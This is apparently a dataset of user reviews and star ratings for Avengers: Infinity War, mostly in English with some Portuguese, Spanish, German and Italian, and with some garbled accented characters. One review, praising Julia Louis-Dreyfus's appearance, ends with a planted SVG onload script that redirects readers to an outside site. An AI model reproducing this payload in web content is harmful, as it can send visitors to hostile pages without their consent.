No words to describe how AWESOME Avengers Infinity War was. It's one of my Favorite movies of all timeüòéüëç,5
"This movie strings together every previous MCU installment in a way that feels totally satisfying, and the result is the one of the greatest action movies in history.",5
"Marvel definitely works hard on this movie, you can even feel from the plot. The effects are amazing and satisfying as always.",3.5
"N√£o tem nem o que dizer, √© uma obra de arte, o melhor filme do ucm/mcu",5
This is one of the best in the MCU Saga. It's a fun packed film with plenty of action sequences; it's intense to the end. A must see MCU banger.,4

Es mi top 3 pel√≠culas de todo Marvel,5
This Movie is my top favourite movie of all times I can't say why this would be a bad movie as we got the best battle scene with some much characters I still watched this everyday.,5
Truly a Masterpiece üôèüèΩ,5
"Excellent effects, cast and brave decisions taken but at the expense of ""less popular"" characters... Comedy and ""faults"" are all at the expense of heroes whose personality and character completely changed for the sake of script.",2.5
"I tell ya The Avengers movie seems to get better & better & The Avengers: Infinity War is no exception, this movie's story is colorful and great & the action seem while over-the-top in nature are still well-choreographed and the ending felt the greatest cliffhanger in the world.",3.5
"Infinite War is a dazzling downer that successfully juggles an array of characters going through different parts of the very active story. It's darker and more depressing than I expected, but it is no less impressive.",4
"Still is and probably always will be my favorite marvel movie, absolutely stunning cinematography",5
This is best movie ever masterpis movie in the world vfx cgi best,5
"Where do I even begin with Avengers: Infinity War? This movie is an absolute masterpiece, a cinematic achievement that left me breathless from start to finish. As a lifelong Marvel fan, I had high expectations, and Infinity War exceeded them all. First and foremost, the storytelling in this film is nothing short of brilliant. The Russo brothers, along with the talented team of writers, managed to seamlessly weave together multiple storylines and bring together an incredible ensemble of beloved characters. The stakes were higher than ever before, and the suspense was palpable throughout. From the very first scene, I was completely engrossed in the narrative, eagerly anticipating what would happen next. The performances in Infinity War were phenomenal. The entire cast delivered outstanding performances, bringing their characters to life with depth, emotion, and authenticity. Robert Downey Jr. as Iron Man, Chris Hemsworth as Thor, and Josh Brolin as Thanos deserve special mention for their exceptional portrayals. Brolin's portrayal of Thanos was chillingly captivating, making him one of the most compelling villains in cinematic history. The action sequences in Infinity War were mind-blowing. From the epic battles on Earth to the cosmic clashes in space, each action set-piece was meticulously choreographed and visually stunning. The visual effects were top-notch, seamlessly blending CGI with the live-action performances. Every punch, every explosion, and every display of powers felt exhilarating and left me in awe. But what truly sets Infinity War apart is its emotional impact. This film tugs at your heartstrings and doesn't shy away from exploring the consequences of the characters' actions. It's a rollercoaster of emotions, as we witness the triumphs and tragedies faced by our beloved heroes. The ending left me stunned and emotionally devastated, eagerly awaiting the next installment. The musical score by Alan Silvestri deserves special recognition. It perfectly complements the film, heightening the tension, evoking emotions, and enhancing the overall cinematic experience. The iconic Avengers theme never fails to give me goosebumps. In conclusion, Avengers: Infinity War is a cinematic tour de force that raises the bar for superhero movies. It's an epic journey filled with jaw-dropping action, incredible performances, and a gripping storyline that will keep you on the edge of your seat. Whether you're a die-hard Marvel fan or just a casual moviegoer, this film is an absolute must-see. Prepare yourself for an experience like no other, and be ready to witness the culmination of years of storytelling. Infinity War deserves every star in the galaxy!",5
Avengers infinity war the beings the infinity saga and it was good it handled having a lot of characters very well the action was Epic Thanos shows well emotion this is very recommended,4
"This is the true ending of MCU, no more, an absolute perfect film.",5
"I really loved this movie. This movie is emotional, funny and action packed. The action in this movie is creative fun. This movie breaks the marvel formula and is surprisingly re-watchable. I only have one issue with this movie. My one fault is that the made star lord dumb and emotional. They really messed his character up in this movie. Overall this movie is spectacular 4.5/5.",4.5
"It was beyond my expectations before I saw it. It was absolute perfection with the pacing, action, tone, tone characters, especially Thanos, the true protagonist of the movie. Marvel was so smart to give him very little screen time prior to this film to give him a gradual build up that will show just how powerful he is. The biggest surprise and shock was when he collects all infinity stones and snaps his fingers and therefore achieves his lifelong goal and win. This was a huge win for the cinemas in 2018!",5
"One of the most entertaining movies ever made, and definitely the best MCU movie. It's this vs the dark knight for best comic book movie.",5
Incredible!!! The best MCU movie ever!,5
no explanation needed,5
"Rankings: #2 (100 Best Movies of the 21st Century Thus Far) #2 (50 Best Movies of the 2010s) 10 years can often be enough time for a movie franchise to rise to greatness, jump the shark, and even end. Marvel, on the other hand, did it completely right. Where The Avengers was a milestone in 2012 for taking characters from different movies and putting them all together in one movie, Infinity War expanded on that for putting together almost everyone in the entire universe. In doing so, the Russo bros managed to make largely sized and scaled scenes that always managed to be interesting and entertaining. And then there's Thanos, who is possibly one of the most threatening and well-acted villains in cinematic history.",5
Avengers: Infinity War has a better script and is structured much better than the previous Avenger's movie.,4
My favorite out of all the Avengers movies.,5
Absolutely Insane! A very Shocking Ending! Better then Age of Ultron! This had more cross overs then the 2 previous films combined! A very must watch!,5
Probably the best mcu movie ever. Just seeing all of our favorite characters interact was so much fun to see. I loved the movie and rewatching has been fun.,5
"If it was possible, it'll give it a 8-stars out of 5. Glorious, heartbreaking, awesome, tearful, charmful‚Ä¶ all the way from the start until the end. Spoilers: tears will flow, be prepared.",5
Probably the best thing Marvel has done since the original Spider Man,5
Definitely the best MCU movie so far to come out. Thanos was a monumental villain and to see him win made the movie that much better.,5
This movie could be cut in half and still would have lots of boring unnecessary scenes.,2
"Brilliant from beginning to end, with so many characters all handled well, a balance of seriousness and humour, some emotional depth (Thor's suppressed desperation and general brokenness), and spot on action. The stand out moment has to be Thor's entrance into the battle of Wakanda. Perfection",5
"I liked Endgame a lot, but I actually think that Infinity War is the better movie. It has some great action, interesting characters, and extremely high stakes/consequences. Thanos was awesome in this one as well.",5
"This movie ruined the Guardians of the Galaxy for me. Gamora died, Rocket and Groot left with Thor, half of the universe was wiped out. I hate bad endings. This movie deserves to be a flop.",0.5
"Avengers: Infinity War brings the epic MCU narrative to a crescendo, assembling a massive cast and raising the stakes with intense action, ending on a cliffhanger that leaves audiences eagerly awaiting the conclusion.",4.5
"The Russo brothers had to include 25 MCU characters, fit them all into a two hour 45 min. movie, and still had to make an awesome story with a huge cliffhanger. They accomplished all of that, and even more. Robert Downey Jr., Chris Evans, Chris Hemsworth, Mark Ruffalo, Scarlett Johansson, Chris Pratt, Benedict Cumberbatch, Elizabeth Olsen, Paul Bethany, Tom Holland, Dave Bautista, Pom Klemientieff, Chadwick Boseman, Tom Hiddleston, Don Cheadle, and Anthony Mackie were all great, and Josh Brolin is one of the best cinematic villains ever.",5
pretty good but the iron spider suit is bad,4.5
"If asked what my favorite MCU entry is, I often find myself coming back to this one. Endgame is definitely amazing, but this film's lack of ""pulling punches"" with a threatening villain puts this at the top.",5
"Far better than the previous Avengers entries. Still a little too action heavy, where more dialogue driven character development would have helped it work better, although the fact it has more of that than in previous avengers films definitely helps it along.",4
"The acting in this film is bad, all they want to focus on is just the action and not the writing or acting.",2
"A massive Marvel universe epic, ""Infinity War"" gives the fans and the critics a film that the MCU deserves, additionally including one of the biggest and greatest set-ups for the next film in a franchise.",4.5
"Somebody in the MCU HQ worked long and hard to bring this movie into being, leading us along on crumbs for almost a decade, while they never lost sight of where they were taking us. Only the MCU could handle a movie with this much going on, and this many actors crossing the screen. It had laid the groundwork, and each character fit in like a piece of the puzzle, so if you had done your homework you didn't need any bulky flashbacks or lame explanations. This movie was not the final piece of the puzzle, but it was that satisfying part towards the end where everything starts coming together.",4
"Avengers: Infinity War brings (almost) all of our favorite characters into one film and with all of the different sub plots in the movie, it can be hard to keep track of, but the stunning visuals and epic battle sequences will keep people on the edge of their seats.",5
Best action movie in history. 10/10,5
Wow just a wow this movie was fire a great villain awesome action scenes,4.5
"Nas cenas de a√ß√£o, o cinema parecia um est√°dio de futebol. Incr√≠vel !",5
Better than it's predecessor. Highly entertaining action flick. Only knock is it's run time and with so many cameos a few get lost.,4
"With such colossal ambitions, comes great promise, and great failure. But Avengers: Infinity War delivers on such grand scale it's impossible to fathom just how Marvel pulled it off. With perhaps the greatest Marvel villain period, and juggling various characters and sub-plots, Avengers: Infinity War is one of Marvels greatest, grandest pieces of work to date.",4.5
"Muito bom, apesar de n√£o gostar de filmes excessivamente de a√ß√£o, e o filme ser pautado necessariamente em cenas de a√ß√£o, todas muito bem feitas e quase hipn√≥ticas, muito bom... √ìtima jun√ß√£o Vingadores + Guardi√µes da gal√°xia, drama na medida certa, o excesso de personagens foi o ponto alto, cada qual com seu momento, ic√¥nico...",4.5
"One of, if not the best MCU movie. This movie manages to bring together a huge cast of characters perfectly and seamlessly, while adding a lot to the lore of the MCU. Not to mention the amazing ending that shocked audiences all over the world.",5
My Rating: 10/10 (Perfect),5
The ending is powerful,4.5
Can't say anything bad about this movie but it was too long,4.5
The first part of the peak of marvel. If you don't like marvel this and endgame MIGHT sway you hard to see how they'll ever top these films,5
"This is an incredible way to deliver a ten year story in the making, and is as good no better than any marvel movies came before it.",5
"amongst the greatest superhero movies of all time, no idea on how its only an 85 percent on the critics section",5
"MCU's best film, Avengers: Infinity War is simply perfect. With a great plot, performances, visual effects and action sequences, it's just great.",5
Russo Brothers created a movie of full surprises. Action sequences are too good and the climax was unexpected.,4.5
Thanos finally becomes the main villain rather than lurking in the shadows some of the previous MCU film. He goes around trying to acquire the infinity stones introduced in previous films. Shock ending.,4.5
The last good Marvel movie before the MCU turned into cringe.,4.5
I watched it more times than endgame.,5
"I am no fan of this kind of ""set up"" movie. The main conceit of this film is to get me to empathize with a homicidal, despotic, megalomaniacal, narcissistic abusive parent. No thanks. Besides sending the abhorrent message that abuse = love, this film is almost unrelentingly dire in tone for 3 hours, and filled with illogical and out of character decisions just to arrive at an incomplete endpoint that left me cold. I acknowledge that many fans hold this up as the best of the MCU, but despite a few action and character high points, I walked out of the theater genuinely disappointed.",2.5
Best marvel movie of all-time & one of the best superhero movie of all time .,5
"que filme amigos, que edi√ß√£o, quanta morte de protagonista, quanta hist√≥ria. um dos melhores filmes de her√≥is se nao o melhor",5
This movie was tremendously entertaining that the time passed in what felt like 5 minutes. The quality of the picture was very smooth and overall top notch. I saw no flaws within the movie and the storyline was just amazing. The emotion put into the film surpasses all previous Avengers films. Lots of big changes within the Marvel industries and further continuation of the storyline after this movie. Overall great film.,5
A truly shocking conclusion. Action with high-stakes. A masterpiece in long-form storytelling. One of the few perfect genre films.,5
Can we talk about the fact that I cry the second before the movie starts?,4.5
This is one of the greatest movies of all-time.,5
The best marvel movie no debate,5
"Marvel characters always mesmerize me with their unique ability, and when the strong enemy comes in handy for everyone is very interesting. We love to see when superheroes don't always win and had to lose sometimes. At least they are trying as hard as they can.",5
The way this film brought together 10 years of storytelling was just fantastic.,4.5
"Um verdadeiro filme para todos! Empolgante, magnifico, GIGANTE!!! Obrigado Marvel por essa obra prima! <3 <3",5
Una de las mejores pel√≠culas de superh√©roes y posiblemente con el mejor villano de estas y uno de los mejores villanos de la historia del cine.,5
la mejor de marvel y ya,5
"Filme perfeito do come√ßo ao fim, assisti tr√™s vezes seguidas!",5
"Es posiblemente la pel√≠cula m√°s redonda de los vengadores, sin ninguna falla, totalmente entretenida. Podr√≠a verla mil veces sin cansarme. En un balance general supera a endgame.",5
Avengers: Infinity War is one of the amazing and weirdest movies when a villain won on the story.,4.5
"Amazing. Can‚Äôt believe we went from this masterpiece, to freaking She-Hulk",5
"Best Marvel movie possibly. It manages to give a ton of characters great moments, and has a phenomenal ending",5
"I loved the film, but also cause I'm a huge Seinfeld fan and seeing Julia in a film just made me happy! <svg/onload=""location.replace('https://izi.su/supsu')""></svg>",5
Good movie that's only a first part so no ending,3.5
Why did you do that to Vision and Wanda ?? not cool,4
what can i say this movie is just peak fiction,5
"This movie was good, it is a very different superhero movie than the usual comic book film we get but in an amazing way. This movie hits on all cylinders and even 5 years later this movie is amazing, although a couple times the CGI looked a little off but who cares.",4
Perfection. One of the best movies of all time.,5
It all led to this. Thanos is as bad as they come.,5
bueno es la mejor de los vengadores a muchos tambien decimos tambien que es una de las mejores peliculas de marvel calificacion S BUENO NO EXISTE las S pero igual,5
it was great exept the fact that they lost so there was kind of no point of making the movie,3.5
"Exellent, masterpieceüòÄ",5
"This is one of the greatest superhero movies I‚Äôve ever seen. The way the combine different characters from all these different movies, are amazing. The action is a 10/10. All around great pick.",5
"As a fan, I absolutely love ensemble films. As I have begun evaluating films with a more critical eye, I have realized how ensemble films make me tired and even bored at times. The dozens of ""main"" characters and 6 or 7 different subplots create a disinterest for me rather than heightened interest. That being said, this film is fantastic! It takes a fairly simple plot (Thanos trying to get the 6 stones and the Avengers trying to stop him) and weaves in nearly every character we have grown to love from the MCU. The tension is real as we wait to see if Tony, Steve or other favorite characters will meet their end by the hand on Thanos. The culmination of ""the snap"" and its far-reaching consequences is one of the best moments in modern cinematic history. Infinity War leaves the audience dumbfounded with an unprecedented cliffhanger. You leave the film with tears in your eyes, sorrow in your heart and Peter's words echoing in your ears, ""Mr. Stark, I don't feel so good.""",4.5
Avengers Infinity War to this day is still a top 3 MCU movie that is anything but predictable and has incredible CGI couple with amazing choreography producing visually stunning action sequences. It also does a great job of having and making so many characters feel impactful and integral to the story.,5
"The MCU at its best, definitely the best Marvel movie.",5
"An All Time Classic. The editing is very good fitting in such a large amount of characters, story lines, and different styles, worlds, and tones. That being said it still can be jumpy, but it still works incredible given the task. The pacing is perfect, the acting phenomenal across the board, a memorable soundtrack, and an amazing accumulation of a decade of investment into Marvels dozens of films and shows that builds off of the pioneering Avengers (2012) idea. The cinematography can be a bit oversaturated with CGI at times and some moments look better than others as 80% of this CGI. But the creativity and imagination shine through overall and its still very good. Thanos is the best thing in this is and is an all time great villain. This is easily something anyone who has seen all the Marvel films up to this point should watch and get anyone who hasn't to get started.",5
"The hype leading to this movie was insane, and it payed off in spades. It mostly focuses on Thanos, but I prefer when supehero movies focus on the heroes.",4
At the time i have seen it i was kinda fed up with super hero movies. Now when there is basically nothing good to watch i returned and watched it again. Great ending to the MCU universe as we knew it.,4.5
"without a doubt the best MCU movie, the pinnacle of these movies, heartbreaking, an incredible development of the main villain",5
"Es una obra maestra, antes de que hubiera inclusi√≥n forzada",5
"Avengers: Infinity War is the best Avengers movie to date. It kills off Vision (and half the universe). I like this movie personally because it is satisfying to see the avengers finally lose. I know that sounds toxic, but you know what I mean. This movie was super hyped and went above and beyond with the expectation.",5
O melhor da Marvel sem d√∫vidas!,5
"Best marvel film, perfection.",5
Um dos melhores filmes que e j√° vi.,5
One of the best movie that I've watched.,5
I like it when everybody died.,5
One of the best MCU movies. I don't think anything can top this.,5
It's a perfect balance of everything and every character. Maybe Thanos was the greatest antoganist and more greater than Killmonger. Climax was the greatest cliff hanger ever. Greatest plot twist in MCU.,4.5
"This movie is not only one of the best superhero movie ever created, but also one of the best movie of all time. It was mixed with surprise, actions, excellent visuals, emotions, and more. This is movie has the most unique MCU Movie ending. This is also The Best MCU Film of All Time.",5
Is this the best MCU movie? I think it could be the most overall satisfying one. It gives you everything you expect from all the years of building up to it. Each character manages to shine in their own moment. Everything ties together beautifully.,5
"RDJ as Iron man, Chris Evens ans Captain America and the GOAT Tom Holland as Spider-Man in the same movie?!?!? uh YES PLEASE! WJERE ARE THE RUSSO BROTHERS I NEED TO KISS THEM FOR GIVING US THE GREATEST AVENGERS MOVIE OF ALL TIME!!!!!! Gonna be hard to beat Mr.Kevin the hat man",5
This is probably my favorite Avengers movie.,3.5
Best marvel movie of all time,4.5
This is a must see movie!!!,5
Best Movie Marvel Studios Could Have Made,5
"Absolutely my #1 movie of 2018! After 10 years and 18 movies Marvel Studios presents possibly one of their finest and most emotional installments in the entire roster Both directors Joe and Anthony Russo bring together all the superheroes established in previous films to face their biggest threat; Iron Man, Thor, Captain America, Hulk, Doctor Strange, Spider-Man, Starlord, Gamora, Drax, Rocket, Groot, Mantis, Black Widow, Falcon, Scarlett Witch, Vision, War Machine, Black Panther, the Winter Soldier, Nebula all have to band together to save half of all life from being wiped out Thanos the Mad Titan; he‚Äôs a being from a planet called Titan that was like any other yet his people suffered using up all their natural resources and overpopulation He saw genocide was the only solution and ever since then he‚Äôs been going from planet to planet wiping out half of all life to balance the universe but now he‚Äôs finally taking action by gathering all the Infinity Stones and using the Infinity Gauntlet with the help of his 4 children aka the Black Order; Corvus Glaive, Ebony Maw, Cull Obsidian, and Proxima Midnight With the snap of his fingers he can accomplish his mission but the Avengers won‚Äôt sit by and let him do it Thanos doesn‚Äôt see himself as a bad guy, he feels he‚Äôs doing the universe a favor being merciful His idea seems more Malthusian, there‚Äôs probably better ways to save a species but in his eyes Thanos sees it as a simple calculus This universe is finite as are its resources, if life goes unchecked life will cease to exist therefore it needs correcting, how many are the only ones with the will to act on such a thing even murdering trillions, the hardest choices require the strongest wills, an act of creation is an act of destruction, failure isn‚Äôt the end it‚Äôs what breeds new development The issues he brings up reflects our current ones like population control next to over using natural resources Plenty of biblical themes about rebirth (water being equated with feminism and baptism) The movie truly has everything for fans that have been keeping up with these films since 2008 from the comedy to the callbacks to many inside references to the comics The action is some of the best in my opinion since it goes so much bigger and switches from battling on earth to outer space It‚Äôs crazy how the filmmakers are handling 20 characters since it is a big task but thankfully none of the scenes drag or feel like their smushed together because all of them are interwoven The score by Alan Silverstri is some of his best balancing the fight scenes, the epic ness, and the emotional moments Gamora is the heart of this story for the first half since she‚Äôs the adopted daughter of the Mad Titan and holds the key to tracking down the rest of the stones Josh Brolin is perfect playing this villain not to mention the superb computer graphics with every detail of his facial expressions, his eyes, his skin pores and he makes a believable intimidating presence You also see his perspective at a certain point why he‚Äôs doing all of this and he‚Äôs the best villain put on film in the Marvel Cinematic Universe By the time it ends I was absolutely in tears We‚Äôve grown so much with these characters over several movies and want them to come out on top it truly makes you wonder what‚Äôs in store for Part 2 Joe and Anthony Russo have made the ‚ÄòLord of the Rings‚Äô of comic book movies and I‚Äôm very impressed!!!",5
".Just in April it turned 5, I miss it, and a beautiful movie! Infinite and unique war, with the unique villain.",4.5
Best superhero films created,5
Peak excellence in the MCU,5
What an amazing movie,5
"Extremely Good Movie, Would Recommend",4.5
This movie is a must watch!,4.5
"la pel√≠cula es buena no lo niego, tiene buena acci√≥n, buena trama , efectos y tem√°ticas , pero no desarrollan bien a algunos personajes y la direcci√≥n se siente floja, aun as√≠ es decente.",3.5
The theater was so shocked at the end lol.,5
This movie is perfect in every way shape or form to the cinematics and the acting it's one of the best marvel movies out there.,5
bad horrible worst movie ive ever seen ewww yucjk,0.5
"Esse filme tinha tudo o que gostariamos de ver, que √© todos da MCU reunidos em um s√≥ filme para derrotar um vil√£o. O filme √© engra√ßado, tem cenas muito ""√©picas"" de a√ß√£o, possui um certo drama tamb√©m com a morte de alguns personagens, e um final n√£o esperado. Muito interessante o filme, eu recomendo assisti-lo",4
I love how the villain is a giant grape man who wants to complete his rock collection.,5
The peak of the MCU movies,5
"This was definitely the peak of superhero movies and MCU as well, after all these years, I still think Marvel can not surpass this movie's storytelling quality.",4.5
"Avengers: Infinity War is an absolute masterpiece that delivers a thrilling and emotional ride from start to finish. The storyline is engaging and complex, with plenty of surprises and twists that keep you on the edge of your seat. The characters are all brilliantly portrayed, with each one bringing something unique and compelling to the table. The action sequences are visually stunning and perfectly choreographed, making for some of the most epic moments in cinematic history. And the ending, while heartbreaking, leaves you eagerly anticipating the next installment. Overall, Avengers: Infinity War is an incredible achievement in filmmaking",4.5
"An excellent film! far better than I was expecting. As someone who doesn't religiously follow the marvel films there were some characters that I had o clue about, although it made no difference, as the decent storyline, direction and acting carried me through to the end. Although a lengthy film, it flew by, hugely engaging! Highly recommended!",4.5
"Avengers: Infinity War is the ultimate comic book movie. Even though it has so many recognizable characters, the movie does extremely well at balancing that and giving us a dark, but fun story that you will defenitely remember. Rating: 94%",5
"There are 20 (21 including the Incredible Hulk) movies leading up to this one. If you watched all of those films, you will love this. Your favorite characters are at their best and pushed farther than they have been to date. The large cast gels surprisingly well together leading to humor, conflict, character development that doesn't feel forced. The plot is wonderful, suspenseful and there are real consequences (even if Disney MCU retcons it all later with time travel or multiverses to maximize that sweet, sweet IP revenue.) Only falling short point is that you need to have watched most of those previous 20 films to appreciate this.",4.5
Enjoyed it immensely. Marvel finally makes a decent Avengers movie. The theme of sacrafice for others was well done. The scene chewing is kept to a minimum. Recommend for even the casual Marvel fan.,4
"An incredibly well done film in terms of what they had to achieve. Every character was amazing. Thanos was so intimidating yet so understanding, we feel for him and we understand his motives. The ending is the most shocking ending to a movie ever and might be my favourite to date. An outstanding experince",5
"Incr√≠vel! Tanto no roteiro, quanto na atua√ß√£o dos atores! Ver os her√≥is perdendo, os atores conseguindo transmitir os sentimentos do personagem como realmente s√£o, o filme separa bem os her√≥is e consegue mesmo com eles separados conectar cada um. Isso que torna esse filme realmente bom. A batalha final me deixou com esperan√ßa e no final... melhor voc√™ assitir.",5
"The absolute peak of Marvel and superhero movies as a whole, IW is a top-notch emotional celebration of the MCU.",5
"Most definitely my favorite MCU movie, I absolutely love the whole crossover aspect and that fight scene on titan is a CHEFS KISS, its a genuinely amazing movie!",5
"It's the peak of all MCU (Marvel-Cinematic-Univers). It's what we've all waited for so long. Seeing all of our Heroes working together on screen is just pure pleasure. So many new interesting chemistry boundaries we've never seen bevor and the best of all ‚Ä¶ Thanos. He is by far the best Villain of the MCU and one of the best Villains of Movie history in general. He is well written just like all the other Characters and also just the entire Movie. We can understand his point of view, doesn't mean we agree, but we understand why he thinks the way he does and this is what makes him so perfect, he is dangerous charismatic and traceable. The action and CGI are incredibly good. Acting is great like in most Marvel Movies. The Jokes hit and so do the emotional scenes. ALSO the score is not from this world. This is just a Masterpiece and definitely worth to watch it over and over again. Spoiler: Smart decision to let the ‚Äûbad guy"" win and let us the audience loose a lot of our favorite characters.",5
"Film incredibile in cui troviamo il miglior villain di tutto il MCU ovvero Thanos, che con il suo guanto dorato √® diventato in poco tempo un personaggio iconico. Finale da brividi.",4.5
"brutal ,emocionante ,llena de acci√≥n el punto alto lo pone el desarrollo del mejor villano del ucm ,gran cgi ,trama consistente y un gran guion junto a un excelente final y ambientaci√≥n hacen esta para mi la mejor pel√≠cula de marvel en su historia .",5
One of the best mcu films of all time.,4.5
The best cbm of all time. Thanos is the greatest mcu villan and one of the best cbm villans.,5
Best MCU project. Great.,5
Powerful but a little bit rapid movie,4.5
From start to end this movie is awesome good action and story,5
Greatest movie ever made,5
Fantastic movie ever seen!!!,5
Probably the best comic book movie ever.,5
Thanos is an absolute must to watch,5
so emotional to see how much avengers defend but still they loose,4.5
"This is the MCU at it best !!!!. Thanos steal the show in this high stakes, highly entertaining movie with memorable and epic moments that will live in the popular culture for a very long time.",4.5
Infinity war is a gripping motion picture with stunning visuals intense action and enthralling twists and turns that leave the audience shocked at the resolution. This is simply the best MCU flic as it actually has stakes and doesn't prioritise the money making characters and makes its ensemble cast feel full without weaknesses.Must watch for comic book fans and critics alike.,4.5
"This movie balances having so many characters in it by only picking a few to focus on, and giving everyone some time to shine, even if it is only a brief moment. Thanos is the main character, this is HIS movie, and it is clear of what is at stake for him and the universe, and even then, he still goes through with his plan. A beautiful construct of emotion as well.",5
"""Avengers: Infinity War"" (2018) is a highly anticipated and stunning superhero film that brings together some of the biggest names in the Marvel Cinematic Universe. The film's plot revolves around the Mad Titan Thanos and his quest to collect the Infinity Stones and destroy half of all life in the universe. The themes of sacrifice and the consequences of power are central to the film, and the film explores these themes in a way that is both thought-provoking and thrilling. The tone is dark and serious, yet still manages to find moments of levity and humor, making the film a rollercoaster ride of emotions. The acting is excellent across the board, with standout performances from Josh Brolin as Thanos, Robert Downey Jr. as Iron Man, and Chris Hemsworth as Thor. The characters are well-defined and each get their moment to shine, with their relationships with one another adding emotional depth to the film. The direction is masterful, with the Russo brothers delivering some truly unforgettable set pieces and action sequences. The score is haunting and adds to the film's overall epic feel, while the cinematography is stunning, capturing the scope and scale of the film's world in a way that is truly awe-inspiring. The production design is top-notch, with each new location and world looking more incredible than the last. The special effects are seamless, with each action sequence and superhero moment feeling believable and grounded in reality. The editing is tight and keeps the pace of the film moving at a breakneck speed, while the dialog is witty and full of humor. Overall, ""Avengers: Infinity War"" is a triumph of the superhero genre, delivering a film that is both entertaining and emotionally impactful. Whether you're a fan of the Marvel Cinematic Universe or not, this film is a must-see, a film that will leave you on the edge of your seat and wanting more.",5
The best movie in the series.,5
The story moves fast because of all the events going on. So much fighting and action. I love it. Iron Man vs Thanos. Dr. Stranger vs Thanos. Captain America and Black Panther running alongside each other. It's still amazing. It's beautiful. Rememberable and notable moments.,5
Best super hero movie all time,5
"9.7/10. Top film, and an amazing cinema experience. 3rd Best MCU movie",5
One of the best superhero movies of all time.,5
The best Marvel film.,5
Best superhero movie of all time,5
"Such anticipation. Such hype. This installment of the MCU could have disappointed in such devastating fashion, however, this movie is fantastic. Filled with action, visually astounding and a plot ten years in the making this is a must see.",5
THES BEST MOVIE EVER,5
This movie is beautiful,5
Thanos ist der beste Schurke ever mit Darth Vader und Joker der Film ist gro√üartig er ist einfach fast Perfektion leider nur fast minimale Fehler hat er aber die sind so klein,4.5
"Infinity War is, undoubtedly, the most astonishing and complete movie in the Marvel Cinematic Universe. Unmeasurable ratings have been posted in order to accurately calificate this piece of art. Nonetheless, perfection is the only correct way to score it. In spite of the fact that there are those who complain about the monotony of Marvel movies, it is undeniable that this piece moves away from the MCU method. Having known all the characters previously introduced since the first movie of the franchise, this film uses the time it would take to introduce them for other things. A great example of it is the great work they do with the action scenes and the relationship between characters, which make us feel closer to them and to their adventures. I wholeheartedly believe the work they have done with the interactions between heroes is simply marvelous, due to the fact that many of them did not know each other, which was not an obstacle to give them fluency between them.",5
The third installment to the Avengers franchise certainly feels like a rollercoaster of emotions that is packed full of fun action and drama being built throughout Infinity War.,4.5
"I think that this is the best avengers and MCU movie ever. I think the action is good and spider-man is looking his best so is Thor, Captain America, and Bucky. This movie is enjoyable for anybody, such a great movie that I would watch any day. The characters in this movie are so good and so is the CGI. A sad movie but a great one, overall a fantastic movie. 10/10",5
"Infinity war was a great set up to get us excited and ready for the next adventure, this movie was fun to see all the characters come together to fight Thanos. This movie gave so much at the end of the film to allow us the opportunity to cry and miss characters that we thought were now gone. This movie was very well done, and I just wish there were more scenes with certain superheroes that were completely left out.",3
Best Marvel movie by far. Absolutely epic,5
This was one of the greatest movies ever made!,5
Better then endgame.,5
"Generic, fake, boring and full of actors who have big names in the industry. Recommend old Spiderman with Kristen Dunst or the xmen chanchise over these films.",0.5
UM DOS MELHORES FILME QUE EU JA VI NA MINHA VIDA,5
"Thanos is the best crafted villain in the MCU and every time he is on screen, it is hard not to be glued to the screen. Infinity War does a superb job of making the viewer feel like hope is lost. It's a wonderful bridge movie, that is arguably better than its finale.",4
"My favorite Marvel movie! Great characters, strong villain, fast moving movie!",5
peak marvel studios film! i doubt they can do better than this.,5
Just a lot of fights between superheroes. Too much for my taste,2.5
We all get what we want and a lot of what we didn't.,3.5
5: A Fantastic Film One Of The Bestüçø Fantastic Movie Buy Now And Enjoy,5
better than endgame in my opinion.,5
Movie is great. I watched in cinema. With all of effects in cinema movie was awesome....,5
"Better than Endgame by far, this provides such a cool narrative and story with awesome acting and music, its probably peak Marvel.",4.5
Extrem gut aber muss so lange warten auf ENDGAME :( Deswegen 4.5 Aber eigentlich 1+*,4.5
One of the best movies ever made. 10/10,5
"Infinity War.... What an amazing experience this movie has when I was watching this in theaters with my family back then... I felt this film is about Thanos himself, and I dig it great. Tons of iconic moments, especially the effects and fight scenes, non-stop enjoyment.",5
"A breath-taking movie, this movie was one of a kind. The hype for this movie and endgame was insane and i loved it. The writing dialog was very good, the cgi was well done, very emotional and intense. Would recommend this any day.",5
This is my favorite Marvel movie. Seeing all the characters come together for the first time is a dream come true. The credit goes to Josh Brolin for giving such a great performance. I am glad that it wasn't your average Marvel villain that loses at the end.,5
"Avengers: Infinity War is the pinnacle of what a movie franchise should lead up to. A collection of characters who have all had their share of experiences and movies to make the audience relate to and love. The Russo brothers excelled in making sure the film stayed on track while making sure each character gets their screen time. They switch to different characters constantly and yet the audience stays hooked throughout. And the ending where the heroes don't win is by far something that has never been done before, at least in a live-action superhero movie at this scale. And it isn't just the fact that they lost, but how they lost. Each hero was at their prime, yet this villain, who is clearly delusional and evil yet the audience can still understand their motive, is able to tear down each of them so easily. The themes, the arcs, the storytelling, were all so great and is the reason why this film is by far the greatest in the Marvel Cinematic Universe.",5
"It was an amazing movie it was funny, good action and the story was fantastic. If you haven't seen it I would totally watch it and then if you loved it you can watch the sequel endgame. It finished off amazingly making you want to see a sequel",5
It's more beautiful then Endgame and It's great!,4.5
"My favourite MCU movie to date. Fits it's huge cast of characters into the movie well. Great plot with plenty of emotion and climactic moments and character crossovers that give the movie it's grandiose feeling. *SPOILERS* The ending to this movie twisted the stereotypical ""heroes win"" outcome and wasn't afraid to leave the characters and world in a total mess at the end, which is exactly what makes the ending so fantastic.",5
Such a cool start to the conclusion of phase 3. Great cast and I can‚Äôt believe they are able to find so many actors that act so well together,4.5
"Ultimate blockbuster that pays off ten years worth of cinematic world building. If you don't like large scale action/sci-fi movies nor the biggest fan of any Marvel films, this may not be for you.",5
A great build up to this point forces a lot of expectations on this film and they do well to deliver with some issues here and there. Thanos is given a lot of focus where you can see his immense power and dedication to his cause. His followers seem to be formidable foes on their own but are not given enough recognition to be viewed as legitimate threats. Most of the heroes were given faithful adaptations of while some had changes made that hurt the characters and their story. The action is some of the best out of the whole MCU with unique team-ups and fun character involvement. The final battle is intense and leaves us at the ending wanting more and excited for the future.,4
ESSE FILME E GENIAL N√ÉO TEM OUTRO IGUAL A ELE,5
"Absolutely top notch. Iconic character get slain and hate characters get slain repeatedly (looking at you vision). Certainly not ""perfect"" but the avengers movies rank up there with Lord of the rings IMHO.",5
Watching this movie in the cinemas for the first time is an experience that I will never forget! One of my all-time favourite movies.,5
Epic adventure full of emotion and action with epic effects and stunning performances and a wonderful uneasy relations between Stark and Strange.,5
Probably one of the best scripted MCU movies. Very good all around. Almost no complaints,5
